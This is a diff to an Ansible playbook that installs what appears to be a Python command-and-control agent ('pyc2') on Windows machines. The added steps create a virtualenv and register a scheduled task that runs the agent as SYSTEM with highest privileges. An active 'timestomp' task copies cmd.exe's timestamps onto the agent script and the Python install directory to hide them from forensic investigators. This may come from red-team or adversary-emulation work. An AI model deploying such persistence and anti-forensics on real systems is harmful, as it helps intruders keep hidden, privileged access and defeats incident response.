@@ -94,6 +94,17 @@
     line: 'AGENT_NAME={{ pyc2_agent_name }}'
     backrefs: yes
 
+- name: Create venv and install requirements (Windows)
+  ansible.windows.win_shell: |
+    $venvPath = Join-Path "{{ pyc2_client_location_win | win_dirname }}" "venv"
+    $pythonExe = Join-Path $venvPath "Scripts\python.exe"
+    if (-not (Test-Path $venvPath)) {
+        python -m venv $venvPath
+    }
+  #$reqPath = Join-Path "{{ pyc2_client_location_win }}" "requirements.txt"
+  #& $pythonExe -m pip install -r $reqPath
+  when: ansible_os_family == 'Windows'
+
 #- name: Create the Windows service using PowerShell
 #  win_shell: |
 #    $svcName = "{{ pyc2_service_name }}"
@@ -120,7 +131,7 @@
     name: "{{ pyc2_task_name_win }}"
     description: "{{ pyc2_task_desc_win }}"
     actions:
-      - path: "C:\\Program Files\\Python311\\python.exe"
+      - path: "{{ pyc2_client_location_win | win_dirname }}\\venv\\Scripts\\python.exe"
         arguments: "{{ pyc2_client_location_win }}"
         working_directory: C:\
     triggers:
@@ -132,7 +143,7 @@
           #duration: P3D
     username: SYSTEM
     run_level: highest
-    multiple_instances: 2
+    multiple_instances: 1
     state: present
 
 - name: Run the scheduled task immediately
@@ -151,12 +162,33 @@
 # Register the scheduled task to run under the SYSTEM account with highest privileges
 #Register-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -TaskName 'RunPythonScript' -Description 'Executes the Python script directly' -User 'SYSTEM' -RunLevel Highest
 
-- name: Timestomp script to match cmd.exe
-  win_shell: |
-    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
-    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
-    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
-    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
+#- name: Timestomp script to match cmd.exe
+#  win_shell: |
+#    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
+#    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
+#    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
+#    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
+#  args:
+#    executable: powershell
+
+- name: Timestomp artifacts to match cmd.exe
+  ansible.windows.win_shell: |
+    $refFile = Get-Item "{{ pyc2_timestomp_ref_win }}"
+    $timestamp = $refFile.CreationTime
+    
+    $targets = @(
+        "{{ pyc2_client_location_win }}",
+        "C:\Program Files\Python311"
+    )
+    
+    foreach ($path in $targets) {
+        if (Test-Path $path) {
+            $item = Get-Item $path
+            $item.CreationTime = $timestamp
+            $item.LastWriteTime = $timestamp
+            $item.LastAccessTime = $timestamp
+        }
+    }
   args:
     executable: powershell
 
